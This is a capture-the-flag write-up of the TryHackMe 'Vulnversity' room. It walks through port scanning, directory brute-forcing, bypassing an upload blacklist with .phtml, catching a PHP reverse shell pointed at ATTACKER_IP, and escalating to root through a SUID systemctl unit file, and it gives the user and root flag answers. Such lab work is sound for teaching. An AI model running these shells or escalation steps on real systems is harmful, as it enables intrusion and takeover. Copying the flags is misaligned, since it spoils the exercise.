---
link: https://tryhackme.com/room/vulnversity
difficulty: Easy
team: red
description: Learn about active recon, web app attacks and privilege escalation.
tags:
image: https://cdn-images.tryhackme.com/room-icons/85dee7ce633f5668b104d329da2769c3.png
solved:
solve date:
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_try_hack_me_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Vulnversity Writeup</p></div>

  <img src="https://cdn-images.tryhackme.com/room-icons/85dee7ce633f5668b104d329da2769c3.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://tryhackme.com/p/nedmoeca">nedmoeca</a></p>
    <p style="margin: 0;">Author(s): <a href="https://tryhackme.com/p/1337rce">1337rce</a></p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary

- **Recon** found a web app on an unusual port (3333), because a full port scan looked past the default top 1000.
- **Enumeration** brute-forced hidden directories and turned up `/internal`, an unlinked upload form.
- **The foothold** came from a weak upload filter: it blacklisted `.php` but not `.phtml`, which Apache still executes as PHP, so a `.phtml` reverse shell gave code execution as `www-data` and the user flag from `bill`'s home.
- **Privilege escalation** exploited a misconfigured SUID `/bin/systemctl` to run a service as root and read the root flag.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1 Deploy the machine
### Q1 Deploy the machine.

==Answer== No answer needed
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 2 Reconnaissance

Gather information about this machine using a network scanning tool called `Nmap`. Check out the [Nmap](https://tryhackme.com/room/furthernmap) room for more on this!

**Connecting to the machine**

This room recommends using the AttackBox, which can be launched by clicking the blue button on the top-right.

**Scan the box**

`nmap -sV 10.48.143.150`.

![](https://cdn-images.tryhackme.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759493375506.png)

Nmap is a free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we use Nmap to scan this machine to identify all services running on a particular port. Nmap has many capabilities; a table summarizes some of its functionality below.

| Nmap flag     | Description                                                                         |
| ------------- | ----------------------------------------------------------------------------------- |
| -sV           | Attempts to determine the version of the services running                           |
| -p <x> or -p- | Port scan for port <x> or scan all ports                                            |
| -Pn           | Disable host discovery and scan for open ports                                      |
| -A            | Enables OS and version detection, executes in-build scripts for further enumeration |
| -sC           | Scan with the default Nmap scripts                                                  |
| -v            | Verbose mode                                                                        |
| -sU           | UDP port scan                                                                       |
| -sS           | TCP SYN port scan                                                                   |
<div align="center">
<br>
<br>
</div>

### Q2 There are many Nmap "cheatsheets" online that you can use too.

==Answer== No answer needed
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q3 Scan the box; how many ports are open?

==Answer== 6
<div align="center">
<br>
<br>
</div>

**Why this step:** Begin every engagement by learning which ports the target actually exposes. A default nmap scan only checks the top 1,000 ports; this box runs services on non-standard high ports, so a full sweep is mandatory before any assumptions.

**Command:**

```
nmap -p- --min-rate 5000 -Pn TARGET_IP
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`nmap`|The network scanner.|
|`-p-`|Scan all 65,535 TCP ports, not just the default top 1,000.|
|`--min-rate 5000`|Send at least 5,000 packets/sec — trades stealth for speed on a lab box.|
|`-Pn`|Skip the initial ping/host-discovery probe; treat the host as up and scan directly.|
|`TARGET_IP`|The machine's IP (set to a shell variable during the engagement).|

**Result:**

```
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes

Nmap done: 1 IP address (1 host up) scanned in 19.09 seconds
```

|Port|Service (nmap guess)|Version|Analysis|Simple Explanation|
|---|---|---|---|---|
|21|ftp|_not yet enumerated_|File transfer; check for anonymous access.|A way to upload/download files — sometimes open to anyone.|
|22|ssh|_not yet enumerated_|Remote login; needs credentials, low priority now.|Remote control of the box — but you need a username/password.|
|139|netbios-ssn|_not yet enumerated_|SMB (older NetBIOS transport).|Windows-style file sharing.|
|445|microsoft-ds|_not yet enumerated_|SMB (modern transport); enumerate shares.|The main file-sharing service — worth poking at.|
|3128|squid-http|_not yet enumerated_|Squid web proxy.|A middle-man for web traffic.|
|3333|dec-notes|_not yet enumerated_|**Mislabelled** — 3333 is a non-standard port; the "dec-notes" name is just nmap's default guess. Almost certainly the web server.|The label is a guess based on the port number, not what's really running.|

**What this gives you:** Key finding - six open TCP ports, with a likely web application on the non-standard port **3333**. The `SERVICE` column here is inferred from port numbers only (no `-sV`), so the "dec-notes" label on 3333 must be verified, not trusted.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q4 What version of the squid proxy is running on the machine?

==Answer== 4.10
<div align="center">
<br>
<br>
</div>

**Why this step:** The port sweep in 1.1 revealed _which_ ports are open but labelled them by guesswork. Fingerprint each one to learn the real software and version and to confirm what's actually running on the non-standard port 3333.

**Command:**

```
nmap -A -p 21,22,139,445,3128,3333 TARGET_IP
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`nmap`|The network scanner.|
|`-A`|Aggressive mode — bundles version detection (`-sV`), default scripts (`-sC`), OS detection (`-O`), and traceroute in one pass.|
|`-p 21,22,139,445,3128,3333`|Limit the scan to the six ports found open in 1.1, so the deeper probes finish quickly.|
|`TARGET_IP`|The target machine.|

**Result:**

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vuln University

Aggressive OS guesses: Linux 5.14 - 6.8 (96%) ...
Service Info: OSs: Unix, Linux
```

|Port|Service|Version|Analysis|Simple Explanation|
|---|---|---|---|---|
|21|ftp|vsftpd 3.0.5|Current release — **not** the backdoored 2.3.4. No known easy exploit.|The file-transfer service is up to date; no free way in.|
|22|ssh|OpenSSH 8.2p1 (Ubuntu)|Patched; needs valid credentials. Park it.|Remote login — useless without a username and password.|
|139/445|netbios-ssn|Samba smbd 4|SMB file sharing. Valid enumeration side-path (shares/users), not the intended route.|File sharing — worth a look, but not the main door here.|
|3128|http-proxy|Squid http proxy 4.10|A web proxy; no obvious foothold.|A traffic middle-man; nothing to exploit directly.|
|3333|http|Apache httpd 2.4.41 (Ubuntu)|**The target.** Confirmed web app, page title "Vuln University".|This is the website we attack.|

**What this gives you:** Key finding - the non-standard port **3333 runs an Apache web application** ("Vuln University"); the FTP and SSH versions are patched, ruling out quick service exploits. The web app is the primary attack surface.

**Next:** Brute-force the web app's directory structure on port 3333 to find non-linked pages; application entry points that aren't visible from the homepage.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q5 How many ports will Nmap scan if the flag -p-400 was used?

==Answer== 400
<div align="center">
<br>
<br>
</div>

Think of it as `-p [start]-[end]`:

- `-p-400` has nothing before the dash, so start defaults to port 1. It reads as `-p 1-400` = **400 ports.**
- `-p-` has nothing on _either_ side, so it's `1-65535` = all ports.
- `-p 400-` has nothing after the dash, so it's `400-65535`.
- `-p 400` with no dash at all is the "just one port".
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q6 What is the most likely operating system this machine is running?

==Answer== Ubuntu
<div align="center">
<br>
<br>
</div>

**Why Ubuntu but `microsoft-ds` on 445:** same trap as the "dec-notes" label on 3333. That first scan had no `-sV`, so the SERVICE column is nmap reading port numbers out of its static `/etc/services` table, not checking what's actually there. Port 445 was historically registered to Microsoft for SMB (Server Message Block), so nmap's table calls _any_ open 445 `microsoft-ds` no matter what OS answers.

The thing to separate is protocol vs software. SMB is the file-sharing _protocol_ Microsoft created, but it's cross-platform, and **Samba** is the Linux/Unix implementation of that same protocol. So a Linux box that wants to do Windows-style file sharing runs Samba, which listens on 139/445 and speaks SMB. nmap labels the port by its Microsoft heritage; the box underneath is still Ubuntu. Your `-A` scan proved it by correcting both entries to `Samba smbd 4`.

One-line rule: the port label describes the port's assigned name, never the OS or the real daemon.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q7 What port is the web server running on?

==Answer== 3333
<div align="center">
<br>
<br>
</div>

From the `-A` scan: `3333/tcp open http Apache httpd 2.4.41`, page title "Vuln University." That's the one non-standard port, and it's the app we'll be attacking.

Navigate to `http://10.48.170.57:3333`.

![[vulnversity_homepage.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q8 It's essential to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open, so constantly scan ports after 1000 (even if you leave checking in the background).

==Answer== No answer needed
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q9 What is the flag for enabling verbose mode using Nmap?

==Answer== `-v`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 3 Locating directories using Gobuster

Using a fast directory discovery tool called `Gobuster`, you will locate a directory to which you can use to upload a shell.

Let's first start by scanning the website to find any hidden directories. To do this, we're going to use Gobuster.

![hacker getting started|261](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716554069307)  

Gobuster is a tool for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names. For this machine, we will focus on using it to brute-force directories.  

Download Gobuster [here(opens in new tab)](https://github.com/OJ/gobuster), or if you're on Kali Linux run `sudo apt-get install gobuster`.

To get started, you will need a wordlist for Gobuster (which will be used to quickly go through the wordlist to identify if a public directory is available. If you use [Kali Linux](https://tryhackme.com/room/kali), you can find many wordlists under `/usr/share/wordlists`. You can also use the wordlist for directories located at `/usr/share/wordlists/dirbuster/directory-list-1.0.txt` in the AttackBox.  

Now let's run Gobuster with a wordlist using `gobuster dir -u http://10.48.143.150:3333 -w` .

| **Gobuster flag** | **Description**                           |
| ----------------- | ----------------------------------------- |
| -e                | Print the full URLs in your console       |
| -u                | The target URL                            |
| -w                | Path to your wordlist                     |
| -U and -P         | Username and Password for Basic Auth      |
| -p **<x>**        | Proxy to use for requests                 |
| -c <http cookies> | Specify a cookie for simulating your auth |
<div align="center">
<br>
<br>
</div>

### Q10 I have successfully configured Gobuster.

==Answer== No answer needed
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q11 What is the directory that has an upload form page?

==Answer== `/internal/`
<div align="center">
<br>
<br>
</div>

**Why this step:** Recon fingerprinted an Apache app on port 3333, but the homepage links only to public content. Brute-force the directory structure to surface non-linked paths, since application features like admin panels and upload forms are often unlinked but still reachable if you know the name.

**Command:**

```
gobuster dir -u http://TARGET_IP:3333 -w /usr/share/wordlists/dirb/common.txt -t 40
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`gobuster dir`|Run gobuster in directory/file brute-force mode.|
|`-u http://TARGET_IP:3333`|Target URL, including the non-standard web port 3333.|
|`-w /usr/share/wordlists/dirb/common.txt`|Wordlist of candidate directory names, tried one per request.|
|`-t 40`|Use 40 concurrent threads for speed.|

**Result:**

```
.htpasswd            (Status: 403) [Size: 280]
.hta                 (Status: 403) [Size: 280]
.htaccess            (Status: 403) [Size: 280]
css                  (Status: 301) [--> /css/]
fonts                (Status: 301) [--> /fonts/]
images               (Status: 301) [--> /images/]
index.html           (Status: 200) [Size: 33014]
internal             (Status: 301) [--> /internal/]
js                   (Status: 301) [--> /js/]
server-status        (Status: 403) [Size: 280]
```

|Path|Status|Meaning|Simple Explanation|
|---|---|---|---|
|`/css`, `/fonts`, `/images`, `/js`|301|Real directories holding static site assets.|Standard website scaffolding, not interesting.|
|`index.html`|200|The homepage itself.|The public front page you already saw.|
|`/internal`|301|Real directory, not linked from the site, non-standard name.|The odd folder out, and where the upload form lives.|
|`.htaccess`, `.htpasswd`, `.hta`, `server-status`|403|Apache config/status endpoints; access forbidden.|Locked server files, dead ends.|

Navigate to `http://10.48.170.57:3333/internal/`:

![[vulnversity_internal_upload.png]]

**What this gives you:** Key finding: the `/internal` directory exists and is not linked anywhere on the public site. Browsing to `http://TARGET_IP:3333/internal/` reveals a file upload form, the entry point for the next phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 4 Compromise the Webserver

Now that you have found a form to upload files, we can leverage this to upload and execute our payload, which will lead to compromising the web server. We will fuzz the upload form to identify which extensions are not blocked.

To do this, we'll use BurpSuite. If you need clarification on what BurpSuite is or how to set it up, please complete our [BurpSuite module](https://tryhackme.com/module/learn-burp-suite) first.

Using BurpSuite

We're going to use Intruder (used for automating customised attacks). To begin, make a wordlist with the following extensions:

- .php
- .php3
- .php4
- .php5
- .phtml

![terminal screenshot](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716554636721)  

Now, make sure BurpSuite is configured to intercept all your browser traffic. Upload a file; once this request is captured, send it to the Intruder. Click on "`Payloads`" and select the "`Sniper`" attack type.

Click the "`Position`s" tab now, find the filename and "`Add §`" to the extension. It should look like this:

![payload position burpsuite](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716554707341)

Now that we know what extension we can use for our payload, we can progress.

Getting a Reverse Shell

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and execute your shell, which will beacon out to you to control! You can download the following reverse PHP shell [here(opens in new tab)](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

To gain remote access to this machine, follow these steps:  

1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to [http://10.10.10.10(opens in new tab)](http://10.10.10.10/) in the browser of your TryHackMe connected device).  
    
2. Rename this file to `php-reverse-shell.phtml`.  
    
3. We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`.  
    
4. Upload your shell and navigate to `http://10.48.170.57:3333/internal/uploads/php-reverse-shell.phtml` - This will execute your payload.

You should see a connection on your Netcat session.

![shell access](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716554998048)  

Answer the following questions based on the above exercise.
<div align="center">
<br>
<br>
</div>

### Q12 What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.

==Answer== `.php`
<div align="center">
<br>
<br>
</div>

**Why this step:** The form blocks `.php` (Q12), but the block is extension-based, so the goal is to find another extension Apache still executes as PHP. Fuzz the upload's filename extension with Burp Intruder against a list of PHP-equivalent extensions and watch which one the server stops rejecting.

**Procedure (Burp Suite Intruder):**

1. In Burp, set **Proxy > Intercept** to on, then upload `test.php` through the form at `http://TARGET_IP:3333/internal/` so the request is captured.
2. Confirm the captured request is `POST /internal/index.php` with a `multipart/form-data` body containing `filename="test.php"`.
3. Right-click the request and choose **Send to Intruder**, then turn intercept off.
4. In **Intruder > Positions**, click **Clear §**, highlight only the `php` in `filename="test.php"`, and click **Add §** so it reads `filename="test.§php§"`. Set attack type to **Sniper**.
5. In **Payloads**, choose payload type **Simple list** and add: `php`, `php3`, `php4`, `php5`, `phtml`. Leave payload URL-encoding as default (the payloads are alphanumeric, so encoding does not affect them).
6. Click **Start attack** and compare the **Length** column across results.

**Result:**

```
Request  Payload   Status   Length
0        (base)    200      774
1        php       200      773
2        php3      200      774
3        php4      200      773
4        php5      200      774
5        phtml     200      759
```

![[vulnversity_intruder_results.png]]

There's your outlier. Ignore the Status column (all `200`, the app returns 200 even on rejection) and the "Response received" column (that's response time in ms, noise here). The signal is **Length**:

- `php`, `php3`, `php4`, `php5` and the baseline all cluster at **773 to 774 bytes**. That's the "Extension not allowed" page, the tiny 1-byte wobble is just the extension string being echoed back at slightly different lengths.
- **`phtml` returns 759 bytes**, breaking the cluster. A different length means a different response body, which means the server did not reject it.

|Payload|Length|Interpretation|Simple Explanation|
|---|---|---|---|
|php, php3, php4, php5|773 to 774|Identical "Extension not allowed" rejection page (1-byte variance from the echoed extension string).|The server said no to all of these.|
|**phtml**|**759**|Different response body: the upload was accepted.|The server accepted this one.|

**Theory, why .phtml works:** Apache decides whether to run a file through the PHP interpreter based on its configured handler mappings, and on many default setups that handler is bound to several extensions, not just `.php`. `.phtml` is a legacy extension (PHP in HTML) that Apache still routes to PHP. The upload filter here uses a **blacklist**: it names specific forbidden extensions (`.php`) and allows everything else. Because the blacklist does not include `.phtml`, a `.phtml` file slips through and is still executed as PHP when requested. The correct defence is an allowlist (permit only known-safe types such as `.jpg` or `.png`) plus validating file content, not enumerating things to forbid.

**What this gives you:** Key finding: the upload form accepts **`.phtml`**, and Apache executes `.phtml` as PHP. This gives a path to upload and run arbitrary PHP code, which is remote code execution.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q13 I understand the Burpsuite tool and its purpose during pentesting.

==Answer== No answer needed
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q14 What extension is allowed after running the above exercise?

==Answer== `.phtml`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q15 While completing the above exercise, I have successfully downloaded the PHP reverse shell.

==Answer== No answer needed
<div align="center">
<br>
<br>
</div>

Prepare a PHP reverse shell, save it with the `.phtml` extension, start a listener, upload it, and trigger it to catch a shell on the target.

**Steps:**

1. Copy the pentestmonkey PHP reverse shell (bundled with Kali) and rename it to the allowed extension in one move:

```
cp /usr/share/webshells/php/php-reverse-shell.php ./php-reverse-shell.phtml
```

2. Edit the shell so it calls back to your machine. Set `$ip` to your TryHackMe `tun0` address and leave `$port` at `1234`:

```
sed -i 's/127.0.0.1/ATTACKER_IP/' php-reverse-shell.phtml
grep -E '\$ip|\$port' php-reverse-shell.phtml
```

3. Start a netcat listener on the matching port and leave it running:

```
nc -lvnp 1234
```

4. Upload `php-reverse-shell.phtml` through the form at `http://TARGET_IP:3333/internal/`, then trigger it by visiting the uploads directory:

```
http://TARGET_IP:3333/internal/uploads/php-reverse-shell.phtml
```

The browser tab hangs, which is expected: the request never returns because the script is busy running the shell.

**Result (listener catches the callback):**

```
listening on [any] 1234 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 58124
Linux ip-TARGET_IP 5.15.0-139-generic #149~20.04.1-Ubuntu SMP x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

**Theory, how a reverse shell works:** A shell is just an interactive command interpreter. A normal (bind) shell would have the target open a listening port and wait for you to connect in, but inbound ports are usually firewalled, so that often fails. A reverse shell flips the direction: the target initiates an outbound connection back to you, and outbound traffic is rarely blocked. You run a listener (`nc -lvnp 1234`) that waits for that call. When the uploaded PHP runs, it connects out to your IP and wires the server's `/bin/sh` to that connection, so everything you type travels to the target and its output comes back to you. The shell runs as whatever account executed it, here `www-data`, the low-privilege service account Apache uses.

**What this gives you:** Key finding: an interactive shell on the target as `www-data`, confirmed by `id` and `whoami`. This is the initial foothold and the pivot point for enumerating the filesystem and escalating privileges.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q16 What is the name of the user who manages the webserver?

==Answer== bill
<div align="center">
<br>
<br>
</div>

**Command:**

```
ls /home
```

**Result:**

```
bill
ubuntu
```

| Account  | What it is                                                                         | Simple Explanation                                              |
| -------- | ---------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| ubuntu   | Default cloud-init account on AWS Ubuntu images.                                   | A stock account the cloud image ships with, not the real owner. |
| **bill** | The human user managing this webserver; owns the web content and holds `user.txt`. | The actual person running the site.                             |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q17 What is the user flag?

==Answer== 8bd7992fbe8a6ad22a63361004cfcedb

**Command:**

```
cat /home/bill/user.txt
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 5 Privilege Escalation

Now that you have compromised this machine, we will escalate our privileges and become the superuser (root).

In Linux, SUID (**set owner userId upon execution**) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (`/usr/bin/passwd`). This is because to change your password, you will need to write to the shadowers file that you do not have access to; `root` does, so it has root privileges to make the right changes.

![](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716555383491)

It's challenge time! We have guided you through this far. Unleash your skills and exploit this system further to escalate your privileges and answer the following questions.
<div align="center">
<br>
<br>
</div>

### Q18 On the system, search for all SUID files. Which file stands out?

==Answer== `/bin/systemctl`
<div align="center">
<br>
<br>
</div>

**Why this step:** As `www-data` you need a privileged mechanism to reach root. SUID binaries run as their owner, so a SUID binary owned by root that can execute arbitrary commands is a ready-made escalation path. Enumerate them and look for anything abnormal.

**Command:**

```
find / -perm -4000 -type f 2>/dev/null
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`find /`|Search the entire filesystem from root.|
|`-perm -4000`|Match files with the SUID bit set.|
|`-type f`|Restrict to regular files.|
|`2>/dev/null`|Discard "Permission denied" errors so only real results show.|

**Result (abridged to the notable entries):**

```
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/bin/su
/bin/mount
/bin/umount
/bin/systemctl        <-- abnormal
/bin/fusermount
/sbin/mount.cifs
... (plus standard /usr/lib helpers and /snap/... duplicates)
```

|Binary|Normal?|Why|Simple Explanation|
|---|---|---|---|
|passwd, chsh, chfn, sudo, su, mount, pkexec, ...|Yes|Standard SUID tools that need elevated rights for a specific task.|Expected system tools, nothing odd.|
|**/bin/systemctl**|**No**|Service manager; services run as root, so SUID systemctl lets any user run commands as root.|The service controller should never be SUID; this is the way in.|

**What this gives you:** Key finding: `/bin/systemctl` carries the SUID bit. Because systemd services execute as root, you can write a malicious service unit and have systemctl start it as root.
<div align="center">
<br>
<br>
</div>

##### Theory, SUID, GTFOBins, and building the payload:

_What SUID means._ A normal program runs with the privileges of whoever launches it. A file with the SUID bit set instead runs with the privileges of its **owner**. When the owner is `root`, the program runs as root no matter who starts it. You spot the bit in a long listing as an `s` in the owner's execute position:

```
ls -l /bin/systemctl
-rwsr-xr-x 1 root root ... /bin/systemctl
```

Many SUID-root binaries are legitimate (`passwd`, `sudo`, `su`, `mount`) because they need root for one specific, tightly controlled job. The risk appears when a binary that can run **arbitrary** commands is left SUID, because then any user can borrow root's power for anything. `systemctl` is that case here.

_How to read a GTFOBins entry._ GTFOBins (`https://gtfobins.github.io`) catalogues how common binaries can be abused. Reading an entry follows a fixed path:

1. The red tags at the top are **capabilities** (Shell, Command, File read/write). Pick the one matching your goal; for root access, choose **Shell**.
2. Inside that section, each lettered variant has **tabs**: `Sudo`, `SUID`, `Capabilities`. Match the tab to how you can reach the binary. A SUID binary means the **SUID** tab.
3. Copy that tab's command block, then substitute its `/path/to/...` placeholders with your own values.

_How the systemctl payload is built._ systemd runs services as root, and `systemctl` is the tool that tells it to. With SUID `systemctl`, a low-privilege user can define a service and have it executed as root. The payload is a small systemd **unit file**:

```
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/rootflag.txt; chmod 666 /tmp/rootflag.txt"
[Install]
WantedBy=multi-user.target
```

Reading it field by field:

|Field|Meaning|
|---|---|
|`[Service]`|Declares a service unit.|
|`Type=oneshot`|Run the command once and exit, rather than staying alive.|
|`ExecStart=`|The command systemd runs, as root. This is the payload slot: here it copies the root-only flag to a world-readable file.|
|`[Install]` / `WantedBy=multi-user.target`|Lets the unit be enabled (hooked into normal startup) so `enable --now` will start it.|

Then three commands weaponize it:

```
TF=$(mktemp).service          # unique temp path for the unit file
/bin/systemctl link $TF       # register the unit by full path
/bin/systemctl enable --now $TF   # start it immediately, as root
```

Because `systemctl` is SUID root, the `ExecStart` command runs with root privileges, giving you root-level actions (here, read the root flag). The `/bin/sh -c "..."` wrapper is only needed to chain two commands in one `ExecStart`; a single command can be written directly.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q19 What is the root flag value?

==Answer== `a58ff8579f0a9270368d33a9966c7fd5`
<div align="center">
<br>
<br>
</div>

**Command:**

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/rootflag.txt; chmod 666 /tmp/rootflag.txt"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/rootflag.txt
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`TF=$(mktemp).service`|Create a unique temp filename ending in `.service` for the unit file.|
|`echo '[Service]...' > $TF`|Write a systemd unit whose `ExecStart` copies the root-only flag to a world-readable file.|
|`/bin/systemctl link $TF`|Register the unit file by its full path.|
|`/bin/systemctl enable --now $TF`|Enable and immediately start the unit; because systemctl is SUID root, `ExecStart` runs as root.|
|`cat /tmp/rootflag.txt`|Read the flag from the world-readable copy.|

**Result:**

```
Created symlink /etc/systemd/system/tmp.2kr1TZTbLc.service -> /tmp/tmp.2kr1TZTbLc.service.
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.2kr1TZTbLc.service -> /tmp/tmp.2kr1TZTbLc.service.

a58ff8579f0a9270368d33a9966c7fd5
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References
